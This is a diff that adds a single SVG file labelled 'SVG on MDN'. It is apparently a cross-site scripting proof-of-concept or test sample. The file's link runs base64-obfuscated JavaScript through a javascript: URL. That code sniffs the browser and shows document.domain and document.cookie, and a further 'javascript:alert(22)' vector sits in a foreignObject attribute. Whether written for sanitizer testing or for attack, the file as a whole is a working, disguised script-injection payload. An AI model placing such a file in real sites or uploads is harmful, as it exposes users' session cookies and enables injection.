@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:www="http://www.w3.org/1999/xhtml" viewBox="0 0 100 100">
+    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" text-anchor="middle" xlink:href="javascript:eval(atob('dmFyIGlzT3BlcmEgPSAoISF3aW5kb3cub3ByICYmICEhb3ByLmFkZG9ucykgfHwgISF3aW5kb3cub3BlcmEgfHwgbmF2aWdhdG9yLnVzZXJBZ2VudC5pbmRleE9mKCcgT1BSLycpID49IDA7CnZhciBpc0ZpcmVmb3ggPSB0eXBlb2YgSW5zdGFsbFRyaWdnZXIgIT09ICd1bmRlZmluZWQnOwp2YXIgaXNTYWZhcmkgPSAvY29uc3RydWN0b3IvaS50ZXN0KHdpbmRvdy5IVE1MRWxlbWVudCkgfHwgKGZ1bmN0aW9uIChwKSB7IHJldHVybiBwLnRvU3RyaW5nKCkgPT09ICJbb2JqZWN0IFNhZmFyaVJlbW90ZU5vdGlmaWNhdGlvbl0iOyB9KSghd2luZG93WydzYWZhcmknXSB8fCAodHlwZW9mIHNhZmFyaSAhPT0gJ3VuZGVmaW5lZCcgJiYgc2FmYXJpLnB1c2hOb3RpZmljYXRpb24pKTsKdmFyIGlzSUUgPSAvKkBjY19vbiFAKi9mYWxzZSB8fCAhIWRvY3VtZW50LmRvY3VtZW50TW9kZTsKdmFyIGlzRWRnZSA9ICFpc0lFICYmICEhd2luZG93LlN0eWxlTWVkaWE7CnZhciBpc0Nocm9tZSA9ICEhd2luZG93LmNocm9tZSAmJiAhIXdpbmRvdy5jaHJvbWUud2Vic3RvcmU7CnZhciBpc0JsaW5rID0gKGlzQ2hyb21lIHx8IGlzT3BlcmEpICYmICEhd2luZG93LkNTUzsKaWYgKGlzRmlyZWZveCkgewogICBhdG9iKCdQSE5qY21sd2RENWhiR1Z5ZENoa2IyTjFiV1Z1ZEM1a2IyMWhhVzRwTzJGc1pYSjBLR1J2WTNWdFpXNTBMbU52YjJ0cFpTazdQQzl6WTNKcGNIUSsnKTsKfSBlbHNlIHsKICAgYWxlcnQoZG9jdW1lbnQuZG9tYWluKTsKICAgYWxlcnQoZG9jdW1lbnQuY29va2llKTsKfQ=='));" fill="" font-size="15" y="80">
+        <path d="M30,1h40l29,29v40l-29,29h-40l-29-29v-40z" stroke="#000" fill="none"/>
+        <path d="M31,3h38l28,28v38l-28,28h-38l-28-28v-38z" fill="#a23"/>
+        <rect height="30" width="120" x="0" rx="15" fill="transparent" y="5"/>
+        <text style="z-index:-1" y="50" x="50">SVG on MDN</text>
+    </a>
+    <foreignObject xmlns:www="http://www.w3.org/1999/xhtml" x="10" y="10" width="800" height="800" requiredFeatures="javascript:alert(22)">
+        
+    </foreignObject>
+</svg>
